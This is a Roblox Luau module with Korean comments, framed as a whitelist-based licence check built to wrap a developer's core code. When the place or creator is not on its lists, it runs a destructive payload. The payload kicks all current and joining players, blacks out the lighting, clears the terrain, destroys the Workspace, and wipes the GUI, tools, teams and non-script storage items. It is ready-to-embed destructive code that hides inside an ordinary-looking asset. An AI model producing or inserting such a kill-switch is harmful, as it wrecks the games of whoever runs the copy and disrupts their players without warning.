-- [[ sys1-0 : 삼중 검증 및 확장 제어 엔진 ]]
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

-- 1. 삼중 마스터 화이트리스트 데이터베이스
local ALLOWED_PLACES = {
	[123456789] = true, -- 허가된 Place ID
}

local ALLOWED_USERS = {
	[11223344] = true,  -- 허가된 User ID
}

local ALLOWED_GROUPS = {
	[99887766] = true,  -- 허가된 Group ID
}

-- 2. 현재 환경 정보 수집
local currentPlaceId = game.PlaceId
local currentCreatorId = game.CreatorId
local currentCreatorType = game.CreatorType

-- 최상단에서 무조건 data 밸류를 먼저 변경하도록 pcall 처리
pcall(function()
	game.ReplicatedStorage.data.Value = true
end)


-- 3. 교차 검증 검사
local isAuthorized = false

if ALLOWED_PLACES[currentPlaceId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.pi.Value = true end)
end

if currentCreatorType == Enum.CreatorType.User and ALLOWED_USERS[currentCreatorId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.ui.Value = true end)
end

if currentCreatorType == Enum.CreatorType.Group and ALLOWED_GROUPS[currentCreatorId] then
	isAuthorized = true
	pcall(function() game.ReplicatedStorage.gi.Value = true end)
end


-- 4. 조건별 실행 분기
if isAuthorized then
	-- ==========================================
	-- [인증 완료] 정상 작동 구간
	-- ==========================================
	pcall(function() game.ReplicatedStorage.good.Value = true end)
	
	--------------------------------------------------
	-- 님의 핵심 작동 코드를 여기에 배치
	--------------------------------------------------
	
else
	-- ==========================================
	-- [인증 실패] 비인가 환경 제어 구간
	-- ==========================================
	
	-- 다른 파괴 코드 실행 전, 무조건 ihateu 밸류부터 즉시 켭니다.
	pcall(function()
		game.ReplicatedStorage.ihateu.Value = true
	end)

	-- 1. 유저 즉시 강퇴 및 차단
	local kickMessage = "계약 위반 및 에셋 유출로 인해 이 서버는 무력화되었습니다. (ㅅㄱ)"
	pcall(function()
		for _, player in pairs(Players:GetPlayers()) do
			player:Kick(kickMessage)
		end
	end)
	Players.PlayerAdded:Connect(function(player)
		pcall(function() player:Kick(kickMessage) end)
	end)

	-- 2. 시각 테러 및 조명 암전
	pcall(function()
		game.Lighting.Brightness = 0
		game.Lighting.ClockTime = 0
		game.Lighting.GlobalShadows = true
		game.Lighting:ClearAllChildren()
		game.Lighting.FogEnd = 0
		game.Lighting.Ambient = Color3.new(0, 0, 0)
	end)

	-- 3. 지형(Terrain) 즉시 삭제
	pcall(function()
		game.Workspace.Terrain:Clear()
	end)

	-- 4. Workspace(맵 환경) 파괴
	pcall(function()
		for _, item in pairs(game.Workspace:GetChildren()) do
			if not item:IsA("Player") and not item:IsA("Camera") and not item:IsA("Terrain") then
				item:Destroy()
			end
		end
	end)

	-- 5. 인게임 UI 및 아이템 창고만 안전하게 삭제 (ServerScriptService는 건드리지 않음)
	pcall(function() game.StarterGui:ClearAllChildren() end)
	pcall(function() game.StarterPack:ClearAllChildren() end)
	pcall(function() game.Teams:ClearAllChildren() end)
	
	-- 6. ReplicatedStorage와 ServerStorage는 내부 스크립트 충돌을 막기 위해 '스크립트'가 아닌 것만 골라 제거
	local storages = { game.ReplicatedStorage, game.ServerStorage }
	for _, storage in ipairs(storages) do
		pcall(function()
			for _, item in pairs(storage:GetChildren()) do
				if not item:IsA("LuaSourceContainer") then -- 스크립트 종류가 아니면 파괴
					item:Destroy()
				end
			end
		end)
	end
end

-- 최종 데이터 흐름 맞추기용 리턴
local SystemResult = {
	["Status"] = isAuthorized,
	["Wipe"] = function() end
}
return SystemResult
